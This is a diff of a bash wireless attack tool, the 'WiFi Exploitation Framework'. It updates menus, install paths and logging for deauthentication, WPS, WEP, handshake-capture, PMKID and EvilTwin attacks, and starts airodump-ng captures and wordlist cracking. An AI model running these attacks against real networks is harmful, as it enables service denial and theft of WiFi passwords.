 function banner(){
-  echo -e "${yC}██╗    ██╗███████╗███████╗"
+  echo -e "${yC}\n██╗    ██╗███████╗███████╗"
   echo -e "██║    ██║██╔════╝██╔════╝               "
   echo -e "██║ █╗ ██║█████╗  █████╗                 "
   echo -e "██║███╗██║██╔══╝  ██╔══╝        ${blueC}WiFi Exploitation Framework ${yC}${program_version}"
@@ -625,10 +658,10 @@ function log_monitor_is_disabled(){
 function log_completed(){
   if [ "$lang" == "en" ]; then
     good_output_ln "+" "Attack completed"; sleep 0.1
-    color_output "*" "Log with some attack info stored in /opt/wef/main/logs/${essid}.log"
+    color_output "*" "An informative log was created to help you to get track of your attacks in /usr/share/wef/main/logs/${log_name}.log"
   else
     good_output_ln "+" "Ataque completado"; sleep 0.1
-    color_output "*" "Log con información sobre el ataque creado en /opt/wef/main/logs/${essid}.log"
+    color_output "*" "Un log informativo fue creado para ayudar con el seguimiento de tus ataques en /usr/share/wef/main/logs/${log_name}.log"
   fi
 }
 
@@ -669,9 +702,9 @@ function log_back_to_menu(){
 
 function log_capture_files(){
   if [ "$lang" == "en" ]; then
-    color_output "*" "Network capture saved as /opt/wef/main/captures/${essid}/${cap_name}.cap"
+    color_output "*" "Network capture saved as /usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
   else
-    color_output "*" "Captura de red guardada como /opt/wef/main/captures/${essid}/${cap_name}.cap"
+    color_output "*" "Captura de red guardada como /usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap"
   fi
 }
 
@@ -706,11 +739,11 @@ function log_attack_info(){
     fi
   fi
 
-  if [ "$packets_to_send" ]; then
+  if [ "$frames_to_send" ]; then
     if [ "$lang" == "en" ]; then
-      echo -e "${blueC} Packets:${grayC} ${packets_to_send}${endC}"
+      echo -e "${blueC} Frames:${grayC} ${frames_to_send}${endC}"
     else
-      echo -e "${blueC} Paquetes:${grayC} ${packets_to_send}${endC}"
+      echo -e "${blueC} Paquetes:${grayC} ${frames_to_send}${endC}"
     fi
   fi
 
@@ -761,9 +794,9 @@ function help_panel(){
     echo -e "\t${yC}-h, --help)${blueC} \t\tShow this help panel"
     echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}"
   else
-    echo -e "\n${blueC}Parametros requeridos:"
+    echo -e "\n${blueC}Parámetros requeridos:"
     echo -e "\t${yC}-i, --interface)${blueC} \tEl nombre de la interfaz de tu tarjeta de red en modo managed"
-    echo -e "\nParametros opcionales:"
+    echo -e "\nParámetros opcionales:"
     echo -e "\t${yC}-h, --help)${blueC} \t\tMuestra este panel de ayuda"
     echo -e "\t${yC}--version)${blueC} \t\tImprime por pantalla la versión actual del programa${endC}"
   fi
@@ -774,26 +807,26 @@ function help_panel(){
 function attacks_panel(){
   if [ "$lang" == "en" ]; then
     echo -e "\n${blueC}--------${yC}DoS attacks${blueC}--------\t--------${yC}WEP attacks${blueC}---------\t-----${yC}Rogue AP attacks${blueC}----${endC}"
-    echo -e "${blueC}[${yC}1${blueC}] Deauthentication attack\t[${yC}9${blueC}]  ARP Replay attack\t\t[${yC}15${blueC}] EvilTwin attack${endC}"
+    echo -e "${blueC}[${yC}1${blueC}] Deauthentication attack\t[${yC}9${blueC}]  ARP Replay attack\t\t[${yC}16${blueC}] EvilTwin attack${endC}"
     echo -e "${blueC}[${yC}2${blueC}] WIDS Confusion attack\t[${yC}10${blueC}] HIRTE attack${endC}"
     echo -e "${blueC}[${yC}3${blueC}] Authentication attack\t[${yC}11${blueC}] Caffe Latte attack${endC}"
     echo -e "${blueC}[${yC}4${blueC}] Beacon Flood attack\t\t[${yC}12${blueC}] Fake Auth attack${endC}"
     echo -e "${blueC}[${yC}5${blueC}] TKIP attack${endC}"
     echo -e "\n${blueC}--------${yC}WPS attacks${blueC}--------\t------${yC}Handshake attacks${blueC}-----${endC}"
-    echo -e "${blueC}[${yC}6${blueC}] Pixie Dust attack\t\t[${yC}13${blueC}] WPA/WPA2 capture attack${endC}"
+    echo -e "${blueC}[${yC}6${blueC}] Pixie Dust attack\t\t[${yC}13${blueC}] WPA/WPA2 capture attack (without deauth)${endC}"
     echo -e "${blueC}[${yC}7${blueC}] PIN Bruteforce attack\t[${yC}14${blueC}] PMKID attack${endC}"
-    echo -e "${blueC}[${yC}8${blueC}] Null PIN attack"
+    echo -e "${blueC}[${yC}8${blueC}] Null PIN attack\t\t[${yC}15${blueC}] Pwnagotchi mode ${endC}"
   else
     echo -e "\n${blueC}---------${yC}Ataques DoS${blueC}---------\t--------${yC}Ataques WEP${blueC}---------\t-----${yC}Ataques Rogue AP${blueC}-----${endC}"
-    echo -e "${blueC}[${yC}1${blueC}] Ataque de deautenticación\t[${yC}9${blueC}]  Ataque ARP Replay\t\t[${yC}15${blueC}] Ataque EvilTwin${endC}"
+    echo -e "${blueC}[${yC}1${blueC}] Ataque de deautenticación\t[${yC}9${blueC}]  Ataque ARP Replay\t\t[${yC}16${blueC}] Ataque EvilTwin${endC}"
     echo -e "${blueC}[${yC}2${blueC}] Ataque de confusión WIDS\t[${yC}10${blueC}] Ataque HIRTE${endC}"
     echo -e "${blueC}[${yC}3${blueC}] Ataque de autenticación\t[${yC}11${blueC}] Ataque Caffe Latte${endC}"
     echo -e "${blueC}[${yC}4${blueC}] Ataque Beacon Flood\t\t[${yC}12${blueC}] Ataque de falsa auth.${endC}"
     echo -e "${blueC}[${yC}5${blueC}] Ataque TKIP${endC}"
     echo -e "\n${blueC}--------${yC}Ataques WPS${blueC}----------\t----${yC}Ataques de Handshake${blueC}----${endC}"
-    echo -e "${blueC}[${yC}6${blueC}] Ataque Pixie Dust\t\t[${yC}13${blueC}] Ataque de captura WPA/2${endC}"
+    echo -e "${blueC}[${yC}6${blueC}] Ataque Pixie Dust\t\t[${yC}13${blueC}] Ataque de captura WPA/2 (sin deauth)${endC}"
     echo -e "${blueC}[${yC}7${blueC}] Ataque de fuerza bruta\t[${yC}14${blueC}] Ataque PMKID${endC}"
-    echo -e "${blueC}[${yC}8${blueC}] Ataque de PIN nulo${endC}"
+    echo -e "${blueC}[${yC}8${blueC}] Ataque de PIN nulo\t\t[${yC}15${blueC}] Modo Pwnagotchi${endC}"
   fi
 }
 
@@ -811,11 +844,11 @@ function commands_panel(){
     echo -e "\n\t${yC}ACCESS POINTS:${endC}"
     echo -e "${blueC}\t scan\t\t\t\tscan nearby access points${endC}"
     echo -e "${blueC}\t list_aps\t\t\tlist already scanned APs${endC}"
-    echo -e "${blueC}\t inhibit <bssid> <channel>\tinhibit connections of an AP until you press Ctrl + C (deauth all clients)${endC}"
+    echo -e "${blueC}\t inhibit <bssid> <channel>\tinhibit connections of an AP until you press Ctrl+C (deauth all clients)${endC}"
     echo -e "${blueC}\t graph <file.csv> <output.png>\tcreate a graph (using airgraph-ng) of APs and its devices (especify an airodump-ng csv file)${endC}"
 
     echo -e "\n\t${yC}HANDSHAKES:${endC}"
-    echo -e "${blueC}\t check <file.cap>\t\t\tcheck if given capture file contains at least one WPA handshake${endC}"
+    echo -e "${blueC}\t check <file.cap>\t\t\tcheck if given capture file contains at least one WPA or PMKID handshake${endC}"
     echo -e "${blueC}\t crack <file.cap> <wordlist.txt>\tcrack given handshake with given wordlist using aircrack-ng${endC}"
     echo -e "${blueC}\t john <file.cap> <wordlist.txt>\t\tcrack given handshake with given wordlist using john the ripper${endC}"
     echo -e "${blueC}\t hashcat <file.cap> <wordlist.txt>\tcrack given handshake with given wordlist using hashcat${endC}"
@@ -825,17 +858,15 @@ function commands_panel(){
     echo -e "${blueC}\t identify <mac>\t\tprint vendor of given MAC address (i.e. D0:37:45:37:B5:6D -> TP-LINK)"
     echo -e "${blueC}\t info\t\t\tshow info about the network adapter interface${endC}"
     echo -e "${blueC}\t panel\t\t\tdisplay attack options panel${endC}"
-    echo -e "${blueC}\t attacks\t\tshow info about the different attacks${endC}"
-    echo -e "${blueC}\t chipsets\t\tlist chipsets that supports monitor mode${endC}"
+    echo -e "${blueC}\t attacks\t\tshow info about the available attacks${endC}"
+    echo -e "${blueC}\t chipsets\t\tlist chipsets that support monitor mode${endC}"
 
     echo -e "\n\t${yC}CONFIG:${endC}"
-    echo -e "${blueC}\t verbose\t\tset verbose on, to see more output${endC}"
-    echo -e "${blueC}\t no verbose\t\tset verbose off, to see less output${endC}"
     echo -e "${blueC}\t update\t\t\tcheck if an update is available and ask you to install it${endC}"
     echo -e "${blueC}\t edit\t\t\tedit config file using default text editor (re-execute tool to apply changes)${endC}"
     echo -e "${blueC}\t clear/cls\t\tclear the screen${endC}"
     echo -e "${blueC}\t version\t\tprint the info about the version of wef${endC}"
-    echo -e "${blueC}\t exit/quit\t\texit from framework${endC}"
+    echo -e "${blueC}\t exit/quit\t\texit the framework${endC}"
     echo -e "${blueC}\t help/?\t\t\tprint this help panel${endC}"
   elif [ "$lang" == "es" ]; then
     echo -e "\n   ${yC}COMANDOS:${endC}"
@@ -849,11 +880,11 @@ function commands_panel(){
     echo -e "\n\t${yC}PUNTOS DE ACCESO:${endC}"
     echo -e "${blueC}\t scan\t\t\t\tescanea los puntos de acceso cercanos${endC}"
     echo -e "${blueC}\t list_aps\t\t\tmuestra la lista de los APs escaneados${endC}"
-    echo -e "${blueC}\t inhibit <bssid> <channel>\tinhibe las conexiones de un AP hasta que presiones Ctrl + C (deautentica a todos los clientes)${endC}"
+    echo -e "${blueC}\t inhibit <bssid> <channel>\tinhibe las conexiones de un AP hasta que presiones Ctrl+C (deautentica a todos los clientes)${endC}"
     echo -e "${blueC}\t graph <file.csv> <output.png>\tcrea un gráfico (usando airgraph-ng) sobre los APs y sus clientes (especifica un archivo csv de airodump-ng)${endC}"
 
     echo -e "\n\t${yC}HANDSHAKES:${endC}"
-    echo -e "${blueC}\t check <file.cap>\t\t\tcomprueba si el archivo especificado contiene al menos un handshake WPA${endC}"
+    echo -e "${blueC}\t check <file.cap>\t\t\tcomprueba si el archivo especificado contiene al menos un handshake WPA o PMKID${endC}"
     echo -e "${blueC}\t crack <file.cap> <wordlist.txt>\tcrackea el handshake dado con la wordlist especificada usando aircrack-ng${endC}"
     echo -e "${blueC}\t john <file.cap> <wordlist.txt>\t\tcrackea el handshake dado con la wordlist especificada usando john the ripper${endC}"
     echo -e "${blueC}\t hashcat <file.cap> <wordlist.txt>\tcrackea el handshake dado con la wordlist especificada usando hashcat${endC}"
@@ -863,16 +894,14 @@ function commands_panel(){
     echo -e "${blueC}\t identify <mac>\t\tmuestra el vendor de la dirección MAC proporcionada (e.g. D0:37:45:37:B5:6D -> TP-LINK)"
     echo -e "${blueC}\t info\t\t\tmuestra información sobre la interfaz del adaptador de red${endC}"
     echo -e "${blueC}\t panel\t\t\tmuestra el panel con las opciones de los ataques${endC}"
-    echo -e "${blueC}\t attacks\t\tmuestra info sobre los diferentes ataques${endC}"
+    echo -e "${blueC}\t attacks\t\tmuestra info sobre los ataques disponibles${endC}"
     echo -e "${blueC}\t chipsets\t\tlista los chipsets que soportan modo monitor${endC}"
 
     echo -e "\n\t${yC}CONFIG:${endC}"
-    echo -e "${blueC}\t verbose\t\tactiva el verbose, para ver mas info durante los ataques${endC}"
-    echo -e "${blueC}\t no verbose\t\tdesactiva el verbose, para ver menos info durante los ataque${endC}"
     echo -e "${blueC}\t update\t\t\tcomprueba si hay alguna actualización disponible y la instala${endC}"
     echo -e "${blueC}\t edit\t\t\tedita el archivo de config usando el editor de texto predeterminado (reejecuta WEF para aplicar los cambios)${endC}"
     echo -e "${blueC}\t clear/cls\t\tlimpia la pantalla${endC}"
-    echo -e "${blueC}\t version\t\timprime la version actual de la herramienta${endC}"
+    echo -e "${blueC}\t version\t\timprime la versión actual de la herramienta${endC}"
     echo -e "${blueC}\t exit/quit\t\tsalir del framework${endC}"
     echo -e "${blueC}\t help/?\t\t\timprime este panel de ayuda${endC}"
   fi
@@ -915,9 +944,9 @@ function chipsets_panel(){
 function ask_target(){
   while true; do
     if [ "$lang" == "en" ]; then
-      color_output_no_line "*" "Introduce target number: " && read number
+      color_output_no_line "*" "Introduce the number of the AP you want to attack: " && read number
     else
-      color_output_no_line "*" "Introduce el número del objetivo: " && read number
+      color_output_no_line "*" "Introduce el número del AP que quieras atacar: " && read number
     fi
 
     if [ ! "$number" ]; then
@@ -946,9 +975,9 @@ function ask_target(){
 
 function ask_target_client(){
   if [ "$lang" == "en" ]; then
-    color_output_no_line "*" "Introduce target client number: " && read client_number
+    color_output_no_line "*" "Introduce the number of the client you want to attack: " && read client_number
   else
-    color_output_no_line "*" "Introduce el número del cliente objetivo: " && read client_number
+    color_output_no_line "*" "Introduce el número del cliente que quieras atacar: " && read client_number
   fi
 
   if [ "${client_number}" == "exit" ] || [ "${client_number}" == "quit" ]; then
@@ -997,19 +1026,19 @@ function ask_time(){
 
 }
 
-# Ask amount of frames to send
-function ask_packets(){
+# Ask amount of deuth frames to send
+function ask_frames(){
   if [ "$lang" == "en" ]; then
-    color_output_no_line "*" "Amount of deauth frames to send (default=${default}): " && read packets_to_send
+    color_output_no_line "*" "Amount of deauth frames to send (default=${default}): " && read frames_to_send
   else
-    color_output_no_line "*" "Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): " && read packets_to_send
+    color_output_no_line "*" "Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): " && read frames_to_send
   fi
 
-  if [ ! "$packets_to_send" ]; then
-    packets_to_send="${default}"
+  if [ ! "$frames_to_send" ]; then
+    frames_to_send="${default}"
   fi
 
-  if [ "$packets_to_send" == "exit" ] || [ "$packets_to_send" == "quit" ]; then
+  if [ "$frames_to_send" == "exit" ] || [ "$frames_to_send" == "quit" ]; then
     ctrl_c
   fi
 }
@@ -1017,9 +1046,9 @@ function ask_packets(){
 # Ask user to capture handshakes
 function ask_to_capture_handshakes(){
   if [ "$lang" == "en" ]; then
-    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture handshakes? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read c_hand
+    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture handshakes? (default=yes) (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read c_hand
   else
-    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los handshakes? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read c_hand
+    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los handshakes? (por defecto=sí) (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read c_hand
   fi
 
   if [ "$c_hand" == "exit" ] || [ "$c_hand" == "quit" ]; then
@@ -1028,7 +1057,7 @@ function ask_to_capture_handshakes(){
 
   # Check user input to start airodump or not
   if [ "$c_hand" == "y" ] || [ "$c_hand" == "yes" ] || [ "$c_hand" == "s" ] || [ "$c_hand" == "si" ] || [ ! "$c_hand" ]; then
-    if [ "$kill_network_services" == "true" ]; then
+    if [ "$airmon_check_kill" == "true" ]; then
       if [ "$lang" == "en" ]; then
         echo -e "${grayC}Do not close airodump-ng window, it will be closed once the attack ends${endC}"
       else
@@ -1045,14 +1074,14 @@ function ask_to_capture_handshakes(){
     c_h="true"
     cap_name=$(date +"%Y-%m-%d-%H-%M-%S")
 
-    if [ ! -d "/opt/wef/main/captures" ]; then
-      mkdir "/opt/wef/main/captures" 2>/dev/null
+    if [ ! -d "/usr/share/wef/main/captures" ]; then
+      mkdir "/usr/share/wef/main/captures" 2>/dev/null
     fi
 
-    if [ "$kill_network_services" == "true" ]; then
-      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${essid}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard}" 2>/dev/null &
+    if [ "$airmon_check_kill" == "true" ]; then
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard}" 2>/dev/null &
     else
-      airodump-ng -c ${channel} -w "/opt/wef/main/captures/${essid}/${cap_name}" --bssid "${ap_bssid}" ${netCard} &>/dev/null &
+      airodump-ng -c ${channel} -w "/usr/share/wef/main/captures/${ap_dir}/${cap_name}" --bssid "${ap_bssid}" ${netCard} &>/dev/null &
     fi
 
     airodump_PID=$!
@@ -1064,9 +1093,9 @@ function ask_to_capture_handshakes(){
 # Ask user to capture IVs
 function ask_to_capture_ivs(){
   if [ "$lang" == "en" ]; then
-    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture IVs? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read c_ivs
+    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture IVs? (default=yes) (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read c_ivs
   else
-    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los IVs? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read c_ivs
+    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los IVs? (por defecto=sí) (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read c_ivs
   fi
 
   if [ "$c_ivs" == "exit" ] || [ "$c_ivs" == "quit" ]; then
@@ -1084,14 +1113,14 @@ function ask_to_capture_ivs(){
     c_i="true"
     cap_name=$(date +"%Y-%m-%d-%H-%M-%S")
 
-    if [ ! -d "/opt/wef/main/captures" ]; then
-      mkdir "/opt/wef/main/captures"
+    if [ ! -d "/usr/share/wef/main/captures" ]; then
+      mkdir "/usr/share/wef/main/captures"
     fi
 
-    if [ "$kill_network_services" == "true" ]; then
-      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${essid}/${cap_name}\" --essid \"${essid}\" ${netCard}" 2>/dev/null &
+    if [ "$airmon_check_kill" == "true" ]; then
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --essid \"${essid}\" ${netCard}" 2>/dev/null &
     else
-      airodump-ng -c ${channel} -w "/opt/wef/main/captures/${essid}/${cap_name}" --essid "${essid}" ${netCard} &
+      airodump-ng -c ${channel} -w "/usr/share/wef/main/captures/${ap_dir}/${cap_name}" --essid "${essid}" ${netCard} &
     fi
 
     airodump_PID=$!
@@ -1126,7 +1155,7 @@ function ask_new_name(){
 
 # Ask for AP BSSID if name is duplicated
 function ask_name_duplicate(){
-  cat /opt/wef/cache/wps_scan.txt | grep "${essid}$"
+  cat /usr/share/wef/cache/wps_scan.txt | grep "${essid}$"
   if [ "$lang" == "en" ]; then
     color_output_no_line "*" "Multiple APs found with that name, enter its BSSID: " && read ap_bssid
   else
@@ -1142,15 +1171,15 @@ function ask_to_crack_handshakes(){
   if [ "${c_h}" == "true" ]; then
     if [ "$(check_handshake)" -gt "0" ]; then
       if [ "$lang" == "en" ]; then
-        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack WPA/WPA2 handshakes? This process will take a long time [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack WPA/WPA2 handshakes? This process will take a long time (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
       else
-        echo -ne "\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes WPA/WPA2? Este proceso tardará bastante tiempo [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+        echo -ne "\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes WPA/WPA2? Este proceso tardará bastante tiempo (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
       fi
     elif [ "$(check_handshake)" -le "0" ] && [ "$(check_pmkid_handshake)" == "true" ]; then
       if [ "$lang" == "en" ]; then
-        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack PMKID handshakes? This process will take a long time [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack PMKID handshakes? This process will take a long time (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
       else
-        echo -ne "\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes PMKID? Este proceso tardará bastante tiempo [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+        echo -ne "\n${blueC}[${yC}*${blueC}] ¿Quieres crackear los handshakes PMKID? Este proceso tardará bastante tiempo (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
       fi
     fi
   fi
@@ -1158,7 +1187,7 @@ function ask_to_crack_handshakes(){
 
 # Ask the user to select a wordlist
 function ask_dict(){
-  if [ -d "/opt/wef/main/wordlists/" ] && [ -f "/opt/wef/main/wordlists/rockyou.txt" ] && [ -f "/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt" ] && [ -f "/opt/wef/main/wordlists/darkweb2017-top10000.txt" ]; then
+  if [ -d "/usr/share/wef/main/wordlists/" ] && [ -f "/usr/share/wef/main/wordlists/rockyou.txt" ] && [ -f "/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt" ] && [ -f "/usr/share/wef/main/wordlists/darkweb2017-top10000.txt" ]; then
     if [ "$lang" == "en" ]; then
       color_output_ln "+" "Available wordlists:"
       echo -e "${blueC}If you want to use a custom dictionary enter its full path${endC}"
@@ -1176,13 +1205,13 @@ function ask_dict(){
     fi
 
     if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
-      wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
+      wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
 
     elif [ "$dic_option" == "2" ] || [ "$dic_option" == "probable" ] || [ "$dic_option" == "probable-v2-wpa-top4800.txt" ]; then
-      wordlist_to_use="/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt"
+      wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
 
     elif [ "$dic_option" == "3" ] || [ "$dic_option" == "darkweb" ] || [ "$dic_option" == "darkweb2017-top10000.txt" ]; then
-      wordlist_to_use="/opt/wef/main/wordlists/darkweb2017-top10000.txt"
+      wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
 
     elif [ -f "${dic_option}" ]; then
       wordlist_to_use="${dic_option}"
@@ -1196,7 +1225,7 @@ function ask_dict(){
       else
         echo -e "${blueC}El diccionario especificado no existe! Seleccionando rockyou.txt por defecto${endC}"
       fi
-      wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"
+      wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
 
     fi
   else
@@ -1231,12 +1260,18 @@ function ask_dict(){
 #
 
 function write_informative_log(){
-  if [ ! -d "/opt/wef/main/logs" ]; then
-    mkdir "/opt/wef/main/logs" 2>/dev/null
+  if [ ! -d "/usr/share/wef/main/logs" ]; then
+    mkdir "/usr/share/wef/main/logs" 2>/dev/null
   fi
 
-  if [ ! -f "/opt/wef/main/logs/${essid}.log" ]; then
-    touch "/opt/wef/main/logs/${essid}.log" 2>/dev/null
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    log_name="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    log_name="${ap_bssid}"
+  fi
+
+  if [ ! -f "/usr/share/wef/main/logs/${log_name}.log" ]; then
+    touch "/usr/share/wef/main/logs/${log_name}.log"
   fi
 
   # Check empty essid
@@ -1285,7 +1320,7 @@ Target access point: ${essid}
 BSSID: ${ap_bssid}
 Attack duration: ${attack_time}
 AP channel: ${channel}
----------------------------------\n" >> "/opt/wef/main/logs/${essid}.log" 2>/dev/null
+---------------------------------\n" >> "/usr/share/wef/main/logs/${log_name}.log" 2>/dev/null
   else
     echo -e "[WEF] WiFi Exploitation Framework
 ---------------------------------
@@ -1295,16 +1330,16 @@ Punto de acceso objetivo: ${essid}
 BSSID: ${ap_bssid}
 Duración del ataque: ${attack_time}
 Canal del AP: ${channel}
----------------------------------\n" >> "/opt/wef/main/logs/${essid}.log" 2>/dev/null
+---------------------------------\n" >> "/usr/share/wef/main/logs/${log_name}.log" 2>/dev/null
   fi
 }
 
 function parse_info(){
-  aps="$(cat /opt/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
+  aps="$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | column -t -s, | tail -n +2)"
   aps_length="$(echo "${aps}" | wc -l)"
 
-  if [ -f "/opt/wef/cache/airodump-01.csv" ] && [[ $number -le $aps_length ]]; then
-    essid=$(cat /opt/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2 | sed "${number}q;d" | rev | cut -d "," -f1 | rev | sed 's/^[[:blank:]]*//')
+  if [ -f "/usr/share/wef/cache/airodump-01.csv" ] && [[ $number -le $aps_length ]]; then
+    essid=$(cat /usr/share/wef/cache/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2 | sed "${number}q;d" | rev | cut -d "," -f1 | rev | sed 's/^[[:blank:]]*//')
     channel=$(echo "${aps}" | sed "${number}q;d" | awk '{print $2}')
     ap_bssid=$(echo "${aps}" | sed "${number}q;d" | awk '{print $1}')
     actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
@@ -1313,15 +1348,15 @@ function parse_info(){
 }
 
 function parse_info_wps(){
-  channel=$(cat /opt/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $2}')
-  essid="$(cat /opt/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $NF}')"
+  channel=$(cat /usr/share/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $2}')
+  essid="$(cat /usr/share/wef/cache/wps_scan.txt | grep "${ap_bssid}" | awk '{print $NF}')"
   actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 }
 
 # Example: 00:C0:CA:B0:23:84
 function get_vendor_from_mac(){
   mac_to_identify="$(echo "${1}" | tr '[:lower:]' '[:upper:]' | tr "-" ":")" # convert possible 00-C0-CA-B0-23-84 format to 00:C0:CA:B0:23:84
-  macs_info="$(cat /opt/wef/mac-vendors.json)"
+  macs_info="$(cat /usr/share/wef/vendors.json)"
 
   mac_1="$(echo "${mac_to_identify%?????????}")" # 00:C0:CA
   vendor="$(echo "${macs_info}" | jq -r '.[] | select(.macPrefix == "'"${mac_1}"'") | .vendorName' 2>/dev/null)"
@@ -1349,9 +1384,9 @@ function get_vendor_from_mac(){
 
 function print_chipset(){
   if [ "$(check_interface_mode)" == "monitor" ]; then
-    good_output "+" "Chipset:${greenC}\t\t\t${chipset}"
+    good_output "+" "Chipset: ${greenC}${chipset}"
   else
-    good_output "+" "Chipset:${grayC}\t\t\t${chipset}"
+    good_output "+" "Chipset: ${grayC}${chipset}"
   fi
 }
 
@@ -1374,11 +1409,11 @@ function check_monitor_type(){
 }
 
 function check_dups(){
-  cat /opt/wef/cache/wps_scan.txt | grep "${essid}$"
+  cat /usr/share/wef/cache/wps_scan.txt | grep "${essid}$"
 }
 
 function check_handshake(){
-  total_amount=$(aircrack-ng "/opt/wef/main/captures/${essid}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")
+  total_amount=$(aircrack-ng "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")
 
   if [ "$total_amount" == "" ]; then
     echo 0
@@ -1388,7 +1423,15 @@ function check_handshake(){
 }
 
 function check_pmkid_handshake(){
-  if [ "$(aircrack-ng "/opt/wef/main/captures/${essid}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep "PMKID")" ]; then
+  if [ "$(echo "1" | aircrack-ng "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep "PMKID")" ]; then
+    echo "true"
+  else
+    echo "false"
+  fi
+}
+
+function check_target_pmkid_handshake(){
+  if [ "$(echo "1" | aircrack-ng "/usr/share/wef/main/captures/${ap_dir}/${cap_name}.cap" 2>/dev/null | grep "WPA" | grep -i "${ap_bssid}" | grep "PMKID")" ]; then
     echo "true"
   else
     echo "false"
@@ -1406,7 +1449,7 @@ function check_handshakes_in_file(){
 }
 
 function check_target_handshakes_in_file(){
-  total_amount=$(echo "1" | aircrack-ng "${1}" 2>/dev/null | grep "WPA" | grep "${ap_bssid}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")
